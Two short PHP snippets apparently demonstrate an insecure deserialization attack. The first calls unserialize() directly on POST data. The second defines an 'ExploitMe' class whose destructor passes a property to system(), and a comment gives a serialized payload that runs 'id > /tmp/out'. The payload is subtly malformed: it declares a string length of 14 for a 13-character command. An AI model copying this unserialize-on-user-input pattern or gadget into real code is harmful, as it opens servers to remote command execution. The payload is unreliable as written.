<?php
if (isset($_POST['data'])) {
    $data = $_POST['data']; 
    $object = unserialize($data); 
    echo "Deserialized object: ";
    print_r($object);
}
?>

<?php
class ExploitMe {
    public $command;

    public function __destruct() {
        // Executes the command when the object is destroyed
        system($this->command);
    }
}
//O:9:"ExploitMe":1:{s:7:"command";s:14:"id > /tmp/out";}
// The value of command is id > /tmp/out, which will be executed by the system() call

?>